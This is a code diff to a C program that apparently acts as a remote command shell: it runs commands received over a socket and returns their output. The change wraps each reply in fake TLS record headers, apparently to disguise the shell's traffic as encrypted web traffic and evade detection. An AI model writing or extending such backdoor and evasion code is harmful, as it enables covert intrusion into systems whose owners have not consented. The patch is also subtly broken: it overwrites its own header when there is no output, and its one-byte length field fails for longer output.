@@ -211,6 +211,9 @@ int main(int argc, char const* argv[]) {
         cmd[cmd_s] = '\0';
 
         char buf_res[5000] = {0};
+        buf_res[0] = 0x17;
+        buf_res[1] = 0x03;
+        buf_res[2] = 0x03;
         int buf_res_s;
         int pipes[2];
         pid_t pid;
@@ -230,14 +233,19 @@ int main(int argc, char const* argv[]) {
             exit(EXIT_FAILURE);
         } else {
             close(pipes[1]);
-            buf_res_s = read(pipes[0], buf_res, sizeof(buf_res));
+            buf_res_s = read(pipes[0], buf_res + 5, sizeof(buf_res) - 5);
             wait(NULL);
         }
+ 
+        if (!buf_res_s) {
+            buf_res_s = 13;
+            strncpy(buf_res, "(No Return)\n", buf_res_s);
+        }
 
-        if (buf_res_s)
-            send(sock, buf_res, buf_res_s, 0);
-        else
-            send(sock, "(No Return)\n", 13, 0);
+        buf_res[3] = 0x00;
+        buf_res[4] = buf_res_s;
+
+        send(sock, buf_res, buf_res_s + 5, 0);
     }
 
     close(client_fd);
